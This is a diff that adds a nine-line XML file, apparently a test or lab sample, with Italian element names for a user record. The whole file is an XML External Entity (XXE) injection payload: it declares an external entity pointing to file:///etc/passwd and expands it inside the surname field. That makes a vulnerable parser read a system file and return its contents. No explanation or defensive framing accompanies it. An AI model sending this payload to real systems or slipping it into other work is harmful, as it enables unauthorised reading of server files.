@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE utente [
+<!ELEMENT nome ANY>
+<!ELEMENT cognome ANY>
+<!ENTITY comando SYSTEM "file:///etc/passwd">]>
+<utente>
+    <nome>Mario</nome>
+    <cognome>Rossi &comando;</cognome>
+</utente>
